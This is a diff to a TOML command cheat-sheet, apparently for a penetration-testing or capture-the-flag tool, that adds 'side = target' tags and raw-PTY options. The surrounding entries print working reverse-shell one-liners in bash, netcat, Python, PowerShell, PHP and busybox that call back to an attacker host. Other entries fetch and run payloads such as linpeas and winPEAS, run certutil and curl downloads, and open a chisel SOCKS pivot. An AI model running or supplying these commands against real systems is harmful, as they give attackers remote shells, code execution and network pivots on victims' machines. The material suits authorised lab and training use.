@@ -157,6 +157,7 @@ category = "shells"
 name = "bash tcp"
 description = "Classic bash reverse shell one-liner"
 template = "bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"
+side = "target"
 tags = ["shell", "revshell", "bash"]
 
 [[command]]
@@ -164,6 +165,7 @@ category = "shells"
 name = "nc mkfifo"
 description = "Netcat reverse shell without -e"
 template = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"
+side = "target"
 tags = ["shell", "revshell", "nc"]
 
 [[command]]
@@ -171,6 +173,7 @@ category = "shells"
 name = "python3 pty"
 description = "Python3 reverse shell with pty"
 template = "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"<LHOST>\",<LPORT>));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn(\"/bin/bash\")'"
+side = "target"
 tags = ["shell", "revshell", "python"]
 
 [[command]]
@@ -178,20 +181,23 @@ category = "shells"
 name = "powershell tcp"
 description = "Windows PowerShell reverse shell"
 template = "powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient('<LHOST>',<LPORT>);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}\""
+side = "target"
 tags = ["shell", "revshell", "windows", "powershell"]
 
 [[command]]
 category = "shells"
 name = "nc listener"
-description = "Catch a shell (your side)"
+description = "Catch a shell (your side). Raw PTY: Ctrl-C/Ctrl-Z go to the remote; input is not echoed until the remote has a PTY (python pty spawn). For full upgrades use penelope or pwncat-cs."
 template = "nc -lvnp <LPORT>"
+raw_pty = true
 tags = ["shell", "listener"]
 
 [[command]]
 category = "shells"
 name = "rlwrap listener"
-description = "Listener with readline (arrow keys/history)"
+description = "Listener with readline (arrow keys/history). Raw PTY so Ctrl-C reaches the remote. For full upgrades use penelope or pwncat-cs."
 template = "rlwrap nc -lvnp <LPORT>"
+raw_pty = true
 tags = ["shell", "listener", "rlwrap"]
 
 [[command]]
@@ -214,6 +220,7 @@ category = "upgrade"
 name = "python pty spawn"
 description = "Upgrade dumb shell to pty"
 template = "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
+side = "target"
 tags = ["upgrade", "tty"]
 
 [[command]]
@@ -221,6 +228,7 @@ category = "upgrade"
 name = "stty raw (local)"
 description = "Run on YOUR box after Ctrl-Z backgrounds the shell"
 template = "stty raw -echo; fg; reset; export TERM=xterm-256color"
+side = "target"
 tags = ["upgrade", "tty", "stty"]
 
 [[command]]
@@ -228,6 +236,7 @@ category = "upgrade"
 name = "script trick"
 description = "Alternative pty upgrade"
 template = "script -qc /bin/bash /dev/null"
+side = "target"
 tags = ["upgrade", "tty"]
 
 # ───────────────────────── file transfer ─────────────────────────
@@ -243,6 +252,7 @@ category = "transfer"
 name = "wget pull"
 description = "Download from your server (victim side)"
 template = "wget http://<LHOST>:<LPORT>/<FILE> -O /tmp/<FILE>"
+side = "target"
 tags = ["transfer", "wget"]
 
 [[command]]
@@ -250,6 +260,7 @@ category = "transfer"
 name = "curl pull"
 description = "Download via curl (victim side)"
 template = "curl http://<LHOST>:<LPORT>/<FILE> -o /tmp/<FILE>"
+side = "target"
 tags = ["transfer", "curl"]
 
 [[command]]
@@ -257,6 +268,7 @@ category = "transfer"
 name = "powershell download"
 description = "Windows file pull"
 template = "powershell -c \"Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -OutFile C:\\Windows\\Temp\\<FILE>\""
+side = "target"
 tags = ["transfer", "windows", "powershell"]
 
 [[command]]
@@ -264,6 +276,7 @@ category = "transfer"
 name = "nc send (sender)"
 description = "Pipe a file over nc — receiver: nc -lvnp <LPORT> > out"
 template = "nc <LHOST> <LPORT> < <FILE>"
+side = "target"
 tags = ["transfer", "nc"]
 
 [[command]]
@@ -386,6 +399,7 @@ category = "pivot"
 name = "chisel client socks"
 description = "Victim connects back, opens SOCKS proxy"
 template = "chisel client <LHOST>:<LPORT> R:socks"
+side = "target"
 tags = ["pivot", "chisel", "socks"]
 
 [[command]]
@@ -408,6 +422,7 @@ category = "misc"
 name = "linpeas pull+run"
 description = "Fetch and run linpeas (victim side)"
 template = "curl -sL http://<LHOST>:<LPORT>/linpeas.sh | sh"
+side = "target"
 tags = ["privesc", "linux", "linpeas"]
 
 [[command]]
@@ -415,6 +430,7 @@ category = "misc"
 name = "sudo -l"
 description = "What can current user run as root"
 template = "sudo -l"
+side = "target"
 tags = ["privesc", "linux"]
 
 [[command]]
@@ -422,6 +438,7 @@ category = "misc"
 name = "find SUID"
 description = "Hunt SUID binaries"
 template = "find / -perm -4000 -type f 2>/dev/null"
+side = "target"
 tags = ["privesc", "linux", "suid"]
 
 [[command]]
@@ -429,6 +446,7 @@ category = "misc"
 name = "writable dirs"
 description = "World-writable directories"
 template = "find / -writable -type d 2>/dev/null | grep -v proc"
+side = "target"
 tags = ["privesc", "linux"]
 
 [[command]]
@@ -444,6 +462,7 @@ category = "shells"
 name = "php tcp"
 description = "PHP reverse shell one-liner"
 template = "php -r '$sock=fsockopen(\"<LHOST>\",<LPORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+side = "target"
 tags = ["shell", "revshell", "php"]
 
 [[command]]
@@ -451,6 +470,7 @@ category = "shells"
 name = "busybox nc"
 description = "busybox netcat reverse shell (-e)"
 template = "busybox nc <LHOST> <LPORT> -e /bin/sh"
+side = "target"
 tags = ["shell", "revshell", "busybox"]
 
 [[command]]
@@ -671,6 +691,7 @@ category = "transfer"
 name = "certutil (win)"
 description = "download on Windows via certutil"
 template = "certutil -urlcache -f http://<LHOST>:<LPORT>/<FILE> <FILE>"
+side = "target"
 tags = ["transfer", "windows"]
 
 [[command]]
@@ -773,6 +794,7 @@ category = "win"
 name = "winpeas pull+run"
 description = "fetch and run winPEASx64 (victim PowerShell)"
 template = "powershell -c \"iwr http://<LHOST>:<LPORT>/winPEASx64.exe -OutFile $env:TEMP\\wp.exe; & $env:TEMP\\wp.exe\""
+side = "target"
 tags = ["privesc", "windows", "winpeas"]
 
 [[command]]
@@ -780,6 +802,7 @@ category = "win"
 name = "whoami /priv"
 description = "token privileges (SeImpersonate etc)"
 template = "whoami /priv"
+side = "target"
 tags = ["privesc", "windows"]
 
 [[command]]
@@ -787,6 +810,7 @@ category = "win"
 name = "systeminfo"
 description = "OS/patch level for exploit matching"
 template = "systeminfo"
+side = "target"
 tags = ["privesc", "windows"]
 
 [[command]]
@@ -794,6 +818,7 @@ category = "win"
 name = "find flags (win)"
 description = "search user/root flags"
 template = "powershell -c \"Get-ChildItem -Path C:\\Users -Recurse -Include user.txt,root.txt -ErrorAction SilentlyContinue\""
+side = "target"
 tags = ["windows", "flags"]
 
 # ── crack additions ──
